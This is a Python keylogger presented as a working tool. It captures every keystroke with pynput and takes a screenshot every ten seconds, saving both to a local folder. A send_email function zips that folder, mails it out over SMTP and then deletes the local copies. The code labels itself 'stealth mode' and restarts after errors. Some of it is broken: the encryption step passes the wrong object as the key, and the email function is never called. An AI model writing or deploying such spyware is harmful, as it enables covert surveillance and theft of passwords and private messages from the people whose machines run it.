from email.mime.text import MIMEText
import os
import time
import platform
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener, Key
import pyautogui
from threading import Thread
from datetime import datetime
import logging
import getpass
from cryptography.fernet import Fernet
import zipfile

# Set up logging to capture errors
logging.basicConfig(filename='error_log.txt', level=logging.ERROR)

# Create a folder to store screenshots and keystrokes
def create_storage_folder():
    if platform.system() == 'Windows':
        storage_path = r'C:\keystroke_data'
    else:
        storage_path = '/home/{}/keystroke_data'.format(getpass.getuser())

    if not os.path.exists(storage_path):
        os.makedirs(storage_path)
    return storage_path

# Encryption function (for securing the keystroke data)
def encrypt_data(data, key):
    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(data.encode())
    return encrypted_data

# Take screenshots periodically
def take_screenshot_periodically(storage_path):
    screenshot_interval = 10  # seconds
    last_activity_time = time.time()

    while True:
        if time.time() - last_activity_time >= screenshot_interval:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            screenshot = pyautogui.screenshot()
            screenshot.save(f"{storage_path}/screenshot_{timestamp}.png")
            last_activity_time = time.time()

        time.sleep(1)

# Handle keystrokes and save them
def log_keystrokes(key, storage_path, current_word):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        if key == Key.space:
            current_word += ' '
        elif key == Key.enter:
            save_data(storage_path, current_word, timestamp)
            current_word = ""
        elif key == Key.backspace:
            current_word = current_word[:-1]
        elif hasattr(key, 'char') and key.char:
            current_word += key.char
    except AttributeError:
        pass
    return current_word

# Save keystroke data to file
def save_data(storage_path, current_word, timestamp):
    try:
        if current_word:
            # Encrypt keystrokes before saving
            encrypted_data = encrypt_data(current_word, Key)
            with open(f"{storage_path}/keystrokes.txt", "a") as file:
                file.write(f"{timestamp} - {current_word}\n")
    except Exception as e:
        logging.error(f"Error saving keystrokes: {str(e)}")

# Send email with the data folder
def send_email(storage_path):
    try:
        # Create the email
        sender_email = "your_email@example.com"
        receiver_email = "recipient_email@example.com"
        subject = "Keystroke and Screenshot Data"
        body = "Attached are the keystroke and screenshot files."

        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        # Attach the folder as a zip file
        zip_file = f"{storage_path}.zip"
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            for root, dirs, files in os.walk(storage_path):
                for file in files:
                    zipf.write(os.path.join(root, file), file)

        # Attach the zip file
        with open(zip_file, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={zip_file}')
            msg.attach(part)

        # Send the email
        server = smtplib.SMTP('smtp.example.com', 587)
        server.starttls()
        server.login(sender_email, "your_email_password")
        text = msg.as_string()
        server.sendmail(sender_email, receiver_email, text)
        server.quit()

        # Remove the folder after email is sent
        shutil.rmtree(storage_path)
        os.remove(zip_file)

    except Exception as e:
        logging.error(f"Error sending email: {str(e)}")

# Encrypt and save the keystroke data securely
def save_secure_data(storage_path, current_word, timestamp, key):
    try:
        if current_word:
            encrypted_data = encrypt_data(current_word, key)
            with open(f"{storage_path}/keystrokes_encrypted.txt", "a") as file:
                file.write(f"{timestamp} - {encrypted_data.decode()}\n")
    except Exception as e:
        logging.error(f"Error saving encrypted data: {str(e)}")

# Main logic with error handling and stealth mode
def main():
    try:
        # Get the encryption key (generate and save it once)
        key = Fernet.generate_key()
        with open("encryption_key.key", "wb") as key_file:
            key_file.write(key)

        storage_path = create_storage_folder()

        # Start screenshot thread
        screenshot_thread = Thread(target=take_screenshot_periodically, args=(storage_path,))
        screenshot_thread.daemon = True
        screenshot_thread.start()

        # Start keylogging
        current_word = ""
        def on_press(key):
            nonlocal current_word
            current_word = log_keystrokes(key, storage_path, current_word)

        with Listener(on_press=on_press) as listener:
            listener.join()

    except Exception as e:
        # Log and restart the script in case of error
        logging.error(f"Error occurred: {str(e)}")
        time.sleep(5)
        main()

# Running in stealth mode
if __name__ == "__main__":
    main()